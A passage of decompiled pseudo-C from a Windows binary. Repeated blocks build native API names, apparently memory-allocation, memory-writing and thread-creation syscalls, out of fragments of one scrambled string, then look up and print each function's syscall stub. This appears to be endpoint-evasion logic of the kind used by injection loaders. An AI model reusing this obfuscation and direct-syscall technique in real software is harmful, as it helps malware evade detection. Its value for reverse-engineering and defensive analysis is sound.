= 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400067b0;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400067c5;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400067d4;\n    fcn.140072260(&stack0x00001cd7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400067f4;\n    fcn.1400a9bc0(&stack0x00001ca8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00001cd7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006811;\n    fcn.1400ba740(&stack0x00001c88 + iVar5, &stack0x00001ca8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000682e;\n    fcn.1400ba740(&stack0x00001c68 + iVar5, &stack0x00001c88 + iVar5, L\"QIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000684b;\n    fcn.1400ba740(&stack0x00001c48 + iVar5, &stack0x00001c68 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006868;\n    fcn.1400ba740(&stack0x00001c28 + iVar5, &stack0x00001c48 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006885;\n    fcn.1400ba740(&stack0x00001c08 + iVar5, &stack0x00001c28 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400068a2;\n    fcn.1400ba740(&stack0x00001be8 + iVar5, &stack0x00001c08 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400068bf;\n    fcn.1400ba740(&stack0x00001bc8 + iVar5, &stack0x00001be8 + iVar5, \n                  L\"AlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400068dc;\n    fcn.1400ba740(&stack0x00001ba8 + iVar5, &stack0x00001bc8 + iVar5, L\"pGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400068f9;\n    fcn.1400ba740(&stack0x00001b88 + iVar5, &stack0x00001ba8 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006916;\n    fcn.1400ba740(&stack0x00001b68 + iVar5, &stack0x00001b88 + iVar5, L\"ThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006933;\n    fcn.1400ba740(&stack0x00001b48 + iVar5, &stack0x00001b68 + iVar5, L\"hdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006950;\n    fcn.1400ba740(&stack0x00001b28 + iVar5, &stack0x00001b48 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000696d;\n    fcn.1400ba740(&stack0x00001b08 + iVar5, &stack0x00001b28 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000698a;\n    fcn.1400ba740(&stack0x00001ae8 + iVar5, &stack0x00001b08 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400069a7;\n    fcn.1400ba740(&stack0x00001ac8 + iVar5, &stack0x00001ae8 + iVar5, L\"dExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400069bd;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00001ac8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400069cc;\n    fcn.1400aa2e0(&stack0x00001ac8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400069db;\n    fcn.1400aa2e0(&stack0x00001ae8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400069ea;\n    fcn.1400aa2e0(&stack0x00001b08 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400069f9;\n    fcn.1400aa2e0(&stack0x00001b28 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a08;\n    fcn.1400aa2e0(&stack0x00001b48 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a17;\n    fcn.1400aa2e0(&stack0x00001b68 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a26;\n    fcn.1400aa2e0(&stack0x00001b88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a35;\n    fcn.1400aa2e0(&stack0x00001ba8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a44;\n    fcn.1400aa2e0(&stack0x00001bc8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a53;\n    fcn.1400aa2e0(&stack0x00001be8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a62;\n    fcn.1400aa2e0(&stack0x00001c08 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a71;\n    fcn.1400aa2e0(&stack0x00001c28 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a80;\n    fcn.1400aa2e0(&stack0x00001c48 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a8f;\n    fcn.1400aa2e0(&stack0x00001c68 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006a9e;\n    fcn.1400aa2e0(&stack0x00001c88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006aad;\n    fcn.1400aa2e0(&stack0x00001ca8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006abc;\n    fcn.140072290(&stack0x00001cd7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006ad2;\n    fcn.1400a9730(&stack0x00001cd8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fd0 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006b0e;\n    uVar3 = fcn.1400015bd(&stack0x00001cd8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006b23;\n    fcn.1400aa2e0(&stack0x00001cd8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006b4b;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006b60;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006b6f;\n    fcn.140072260(&stack0x00001f67 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006b8f;\n    fcn.1400a9bc0(&stack0x00001f38 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00001f67 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006bac;\n    fcn.1400ba740(&stack0x00001f18 + iVar5, &stack0x00001f38 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006bc9;\n    fcn.1400ba740(&stack0x00001ef8 + iVar5, &stack0x00001f18 + iVar5, \n                  L\"AlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006be6;\n    fcn.1400ba740(&stack0x00001ed8 + iVar5, &stack0x00001ef8 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006c03;\n    fcn.1400ba740(&stack0x00001eb8 + iVar5, &stack0x00001ed8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006c20;\n    fcn.1400ba740(&stack0x00001e98 + iVar5, &stack0x00001eb8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006c3d;\n    fcn.1400ba740(&stack0x00001e78 + iVar5, &stack0x00001e98 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006c5a;\n    fcn.1400ba740(&stack0x00001e58 + iVar5, &stack0x00001e78 + iVar5, L\"RsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006c77;\n    fcn.1400ba740(&stack0x00001e38 + iVar5, &stack0x00001e58 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006c94;\n    fcn.1400ba740(&stack0x00001e18 + iVar5, &stack0x00001e38 + iVar5, L\"sFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006cb1;\n    fcn.1400ba740(&stack0x00001df8 + iVar5, &stack0x00001e18 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006cce;\n    fcn.1400ba740(&stack0x00001dd8 + iVar5, &stack0x00001df8 + iVar5, \n                  L\"my\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006ceb;\n    fcn.1400ba740(&stack0x00001db8 + iVar5, &stack0x00001dd8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006d08;\n    fcn.1400ba740(&stack0x00001d98 + iVar5, &stack0x00001db8 + iVar5, L\"ThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006d25;\n    fcn.1400ba740(&stack0x00001d78 + iVar5, &stack0x00001d98 + iVar5, L\"hdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006d42;\n    fcn.1400ba740(&stack0x00001d58 + iVar5, &stack0x00001d78 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006d5f;\n    fcn.1400ba740(&stack0x00001d38 + iVar5, &stack0x00001d58 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006d7c;\n    fcn.1400ba740(&stack0x00001d18 + iVar5, &stack0x00001d38 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006d99;\n    fcn.1400ba740(&stack0x00001cf8 + iVar5, &stack0x00001d18 + iVar5, L\"dExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006daf;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00001cf8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006dbe;\n    fcn.1400aa2e0(&stack0x00001cf8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006dcd;\n    fcn.1400aa2e0(&stack0x00001d18 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006ddc;\n    fcn.1400aa2e0(&stack0x00001d38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006deb;\n    fcn.1400aa2e0(&stack0x00001d58 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006dfa;\n    fcn.1400aa2e0(&stack0x00001d78 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e09;\n    fcn.1400aa2e0(&stack0x00001d98 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e18;\n    fcn.1400aa2e0(&stack0x00001db8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e27;\n    fcn.1400aa2e0(&stack0x00001dd8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e36;\n    fcn.1400aa2e0(&stack0x00001df8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e45;\n    fcn.1400aa2e0(&stack0x00001e18 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e54;\n    fcn.1400aa2e0(&stack0x00001e38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e63;\n    fcn.1400aa2e0(&stack0x00001e58 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e72;\n    fcn.1400aa2e0(&stack0x00001e78 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e81;\n    fcn.1400aa2e0(&stack0x00001e98 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e90;\n    fcn.1400aa2e0(&stack0x00001eb8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006e9f;\n    fcn.1400aa2e0(&stack0x00001ed8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006eae;\n    fcn.1400aa2e0(&stack0x00001ef8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006ebd;\n    fcn.1400aa2e0(&stack0x00001f18 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006ecc;\n    fcn.1400aa2e0(&stack0x00001f38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006edb;\n    fcn.140072290(&stack0x00001f67 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006ef1;\n    fcn.1400a9730(&stack0x00001f68 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fc8 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006f2d;\n    uVar3 = fcn.1400015bd(&stack0x00001f68 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006f42;\n    fcn.1400aa2e0(&stack0x00001f68 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006f6a;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006f7f;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006f8e;\n    fcn.140072260(&stack0x000021d7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006fae;\n    fcn.1400a9bc0(&stack0x000021a8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x000021d7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006fcb;\n    fcn.1400ba740(&stack0x00002188 + iVar5, &stack0x000021a8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006fe8;\n    fcn.1400ba740(&stack0x00002168 + iVar5, &stack0x00002188 + iVar5, L\"GDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007005;\n    fcn.1400ba740(&stack0x00002148 + iVar5, &stack0x00002168 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007022;\n    fcn.1400ba740(&stack0x00002128 + iVar5, &stack0x00002148 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000703f;\n    fcn.1400ba740(&stack0x00002108 + iVar5, &stack0x00002128 + iVar5, L\"CThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000705c;\n    fcn.1400ba740(&stack0x000020e8 + iVar5, &stack0x00002108 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007079;\n    fcn.1400ba740(&stack0x000020c8 + iVar5, &stack0x000020e8 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007096;\n    fcn.1400ba740(&stack0x000020a8 + iVar5, &stack0x000020c8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400070b3;\n    fcn.1400ba740(&stack0x00002088 + iVar5, &stack0x000020a8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400070d0;\n    fcn.1400ba740(&stack0x00002068 + iVar5, &stack0x00002088 + iVar5, L\"xRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400070ed;\n    fcn.1400ba740(&stack0x00002048 + iVar5, &stack0x00002068 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000710a;\n    fcn.1400ba740(&stack0x00002028 + iVar5, &stack0x00002048 + iVar5, L\"ThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007127;\n    fcn.1400ba740(&stack0x00002008 + iVar5, &stack0x00002028 + iVar5, L\"hdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007144;\n    fcn.1400ba740(&stack0x00001fe8 + iVar5, &stack0x00002008 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007161;\n    fcn.1400ba740(&stack0x00001fc8 + iVar5, &stack0x00001fe8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000717e;\n    fcn.1400ba740(&stack0x00001fa8 + iVar5, &stack0x00001fc8 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000719b;\n    fcn.1400ba740(&stack0x00001f88 + iVar5, &stack0x00001fa8 + iVar5, L\"dExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400071b1;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00001f88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400071c0;\n    fcn.1400aa2e0(&stack0x00001f88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400071cf;\n    fcn.1400aa2e0(&stack0x00001fa8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400071de;\n    fcn.1400aa2e0(&stack0x00001fc8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400071ed;\n    fcn.1400aa2e0(&stack0x00001fe8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400071fc;\n    fcn.1400aa2e0(&stack0x00002008 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000720b;\n    fcn.1400aa2e0(&stack0x00002028 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000721a;\n    fcn.1400aa2e0(&stack0x00002048 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007229;\n    fcn.1400aa2e0(&stack0x00002068 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007238;\n    fcn.1400aa2e0(&stack0x00002088 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007247;\n    fcn.1400aa2e0(&stack0x000020a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007256;\n    fcn.1400aa2e0(&stack0x000020c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007265;\n    fcn.1400aa2e0(&stack0x000020e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007274;\n    fcn.1400aa2e0(&stack0x00002108 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007283;\n    fcn.1400aa2e0(&stack0x00002128 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007292;\n    fcn.1400aa2e0(&stack0x00002148 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400072a1;\n    fcn.1400aa2e0(&stack0x00002168 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400072b0;\n    fcn.1400aa2e0(&stack0x00002188 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400072bf;\n    fcn.1400aa2e0(&stack0x000021a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400072ce;\n    fcn.140072290(&stack0x000021d7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400072e4;\n    fcn.1400a9730(&stack0x000021d8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fc0 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007320;\n    uVar3 = fcn.1400015bd(&stack0x000021d8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007335;\n    fcn.1400aa2e0(&stack0x000021d8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000735d;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007372;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007381;\n    fcn.140072260(&stack0x00002447 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400073a1;\n    fcn.1400a9bc0(&stack0x00002418 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00002447 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400073be;\n    fcn.1400ba740(&stack0x000023f8 + iVar5, &stack0x00002418 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400073db;\n    fcn.1400ba740(&stack0x000023d8 + iVar5, &stack0x000023f8 + iVar5, L\"SngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400073f8;\n    fcn.1400ba740(&stack0x000023b8 + iVar5, &stack0x000023d8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140007415;\n    fcn.1400ba740(&stack0x00002398 + iVar5, &stack0x000023b8 + iVar5, \n                  